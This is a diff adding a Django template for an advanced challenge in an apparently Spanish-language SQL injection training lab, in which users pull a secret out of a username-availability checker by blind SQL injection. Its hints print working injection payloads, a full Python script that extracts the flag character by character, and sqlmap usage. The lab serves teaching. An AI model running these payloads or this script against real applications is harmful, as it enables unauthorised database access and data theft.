@@ -1,0 +1,88 @@
+{% extends "accounts/base.html" %}
+
+{% block content %}
+  <div class="brief">
+    <strong>Reto 5 (avanzado):</strong> verificador de disponibilidad de
+    usuario. No hay errores visibles, no hay datos en pantalla — solo
+    "Disponible" o "No disponible". Esta es la técnica real de <em>blind
+    SQL injection</em>: cuando no ves nada, pero igual puedes hacerle
+    preguntas de sí/no a la base de datos, una por una.
+  </div>
+
+  <div class="card">
+    <h2>Verificar disponibilidad</h2>
+    <p class="sub">¿Ese nombre de usuario ya está en uso?</p>
+    <form method="get" action="{% url 'verificar' %}">
+      <label for="id_usuario">Nombre de usuario</label>
+      <input type="text" id="id_usuario" name="usuario" value="{{ usuario }}" autocomplete="off" autofocus>
+      <button type="submit">Verificar</button>
+    </form>
+
+    {% if error %}
+      <div class="result error">⚠️ {{ error }}</div>
+    {% elif resultado == 'disponible' %}
+      <div class="result disponible">✅ Disponible.</div>
+    {% elif resultado == 'no_disponible' %}
+      <div class="result no_disponible">⛔ No disponible (ya existe).</div>
+    {% endif %}
+
+    <div class="hints">
+      <span class="summary-label">Pistas</span>
+
+      <details class="hint">
+        <summary>Pista 1</summary>
+        <p>Prueba con <code>admin</code> (sabes que existe) y con algo
+        inventado como <code>xyz123</code>. Compara las dos respuestas —
+        esa diferencia es tu única señal en todo este reto.</p>
+      </details>
+      <details class="hint">
+        <summary>Pista 2</summary>
+        <p>Prueba <code>x' OR '1'='1</code>. Si la respuesta cambia a "No
+        disponible" aunque <code>x</code> no exista, confirmaste la
+        inyección — y de paso aprendiste qué mensaje corresponde a
+        "verdadero" y cuál a "falso". (Ojo: es un poco contraintuitivo —
+        "No disponible" es la señal de que tu condición fue verdadera.)</p>
+      </details>
+      <details class="hint">
+        <summary>Pista 3</summary>
+        <p>Ahora reemplaza esa condición fija por una pregunta real: en
+        SQLite, <code>substr(texto, posición, 1)</code> devuelve un solo
+        carácter. Puedes preguntar "¿el primer carácter de tal valor es
+        'A'?" y leer la respuesta en Disponible/No disponible.</p>
+      </details>
+      <details class="hint">
+        <summary>Ver payload y script de extracción</summary>
+        <p>Hay una tabla <code>secretos</code> con un valor que tienes que
+        reconstruir carácter por carácter:</p>
+        <pre>x' OR (SELECT substr(valor,1,1) FROM secretos)='A' -- </pre>
+        <p>Repetir esto a mano 40+ veces no tiene gracia — automatízalo.
+        Ejemplo en Python (ajusta la URL si desplegaste en Railway):</p>
+        <pre>import requests
+
+BASE = "http://127.0.0.1:8000/verificar/"
+CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"
+
+flag = ""
+for pos in range(1, 60):
+    for c in CHARS:
+        payload = f"x' OR (SELECT substr(valor,{pos},1) FROM secretos)='{c}' -- "
+        r = requests.get(BASE, params={"usuario": payload})
+        if "No disponible" in r.text:
+            flag += c
+            print(flag)
+            break
+    else:
+        break  # ningún carácter calzó: llegamos al final del valor
+
+print("FLAG:", flag)</pre>
+        <p>Una vez que entiendas el concepto a mano, así es como lo
+        automatiza un pentester real: herramientas como
+        <a href="https://sqlmap.org/" target="_blank" rel="noopener">sqlmap</a>
+        detectan y explotan blind SQLi (y los otros tipos de este
+        laboratorio) sin escribir nada de esto a mano. Pruébala apuntando a
+        <code>/verificar/?usuario=x</code> con <code>--data</code> o
+        <code>-u</code> y <code>-p usuario</code>.</p>
+      </details>
+    </div>
+  </div>
+{% endblock %}
